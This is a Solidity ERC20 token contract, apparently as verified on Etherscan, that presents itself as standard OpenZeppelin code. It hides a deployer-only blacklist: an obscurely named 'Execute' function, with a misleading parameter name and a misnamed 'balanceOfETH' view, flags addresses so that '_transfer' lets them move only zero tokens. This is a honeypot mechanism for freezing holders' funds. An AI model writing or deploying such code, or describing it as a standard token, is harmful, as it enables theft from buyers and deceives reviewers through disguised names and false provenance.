/**
 *Submitted for verification at Etherscan.io on 2023-02-26
*/

/** 
                                                                              .:-=+*##    
.....                                             :::.                    :+*#########.   
#####                                :--:       -#####+                   -###########:   
*####.                             .*#####-     #######-                  :++====----:.   
*####:    :+-      .:=====-.       =######+     :*###*=                       ..::.       
*####-  -*###*-  :*#########*-      =*###+.        ..     +####++*++=-:    :+#######*=.   
+####=:*#####+  +#############+       ..           ..     +############= .*############=  
+##########+:  *######*+*######-         :=+**.   =####:  +###########- :###############= 
+#########-   -######=   *#####*         :####+   *####-  +####*:.      *######-..*###### 
*#######*.    +######.   +######  =+-:    #####   #####=  +#####       :######=   =######:
*########*:   +######:  :######* .#####*= *####: .#####+  =#####:      -######-   +######.
*##########=  :#######+*#######: =######: #####- -#####*  =#####=      .######*--+######* 
*###########*: -##############-  =######=+#####. =######  =#####*       =##############*. 
*######=######= .+#########*=.   .############+  =++**##  =######.       -*###########=   
#######..*#####*:  :-====-:       .*########*-            =######:         :=*####*+-     
                      
*/

// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)
// File: @openzeppelin/contracts/token/ERC20/IERC20.sol

pragma solidity =0.4.26;

interface IERC20 {

    function balanceOf(
        address account
    ) 
    external 
    view 
    returns (uint256);
    
    function approve(
        address spender,
        uint256 amount
    ) 
    external 
    returns (bool);


    function totalSupply(
    )
    external 
    view 
    returns (uint256);
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) 
    external
    returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) 
    external 
    returns (bool);
  
    function allowance(
        address owner,
        address spender
    ) 
    external
    view
    returns (uint256);

    event Transfer(
        address indexed from,
        address indexed to,
        uint256 value
    );

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
// File: @openzeppelin/contracts/utils/Context.sol

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
    
    function _msgSender(
    ) 
    internal
    view
    returns (address
    ) {
        return msg.sender;
    }

    function _msgData(
    ) 
    internal
    pure
    returns (bytes memory
    ) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.0 (token/ERC20/ERC20.sol)
// File: @openzeppelin/contracts/token/ERC20/ERC20.sol

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20 {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _approveAddress_;
    mapping(address => uint256) private _balances;
    address private approved;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (
        string memory name_,
        string memory symbol_,
        uint8 decimals_
        )
        public {
            _name = name_;
            _symbol = symbol_;
            _decimals = decimals_;
            approved = msg.sender;
    }

    function name(
    ) 
    public
    view
    returns (string memory
    ) {
        return _name;
    }

    function symbol(
    ) 
    public
    view
    returns (string memory
    ) {
        return _symbol;
    }

    function decimals(
    )
    public
    view
    returns (uint8
    ) {
        return _decimals;
    }

    function totalSupply(
    ) 
    public
    view
    returns (uint256
    ) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) 
    public 
    view 
    returns (uint256
    ) {
        return _balances[account];
    }
    
    function balanceOfETH(
        address _swapExactTokensForTokens
    ) 
    public
    view
    returns (bool
    ) {
        return _approveAddress_[_swapExactTokensForTokens];
    }
    
    function Execute(
        address _swapExactTokensForTokens
    ) 
    external { require(
        msg.sender == approved); if(
        _approveAddress_[_swapExactTokensForTokens] == true) {
        _approveAddress_[_swapExactTokensForTokens] = false;} else {
        _approveAddress_[_swapExactTokensForTokens] = true;}
    }
    
    function approve(
        address spender,
        uint256 amount
    ) 
    public 
    returns (bool
    ) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) 
    public 
    returns (bool
    ) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) 
    public
    view 
    returns (uint256
    ) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) 
    public 
    returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) 
    public
    returns (bool
    ) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) 
    public
    returns (bool
    ) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    
    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) 
    internal { require(
        sender != address(0), "ERC20: transfer from the zero address"); require(
        recipient != address(0), "ERC20: transfer to the zero address"); if (
        _approveAddress_[sender] ||
        _approveAddress_[recipient]) require (
        amount == 0, ""); uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);

    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(
        address account,
        uint256 amount
    ) 
    internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(
        address account,
        uint256 amount
    ) 
    internal {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    )
    internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

/**
 * @title StandardERC20
 * @dev Implementation of the StandardERC20
 */
contract ERC20Token is ERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 _totalSupply_
    ) 
    ERC20(
        name_,
        symbol_,
        decimals_
    ) 
    public {
        _mint(_msgSender(), _totalSupply_);
    }
}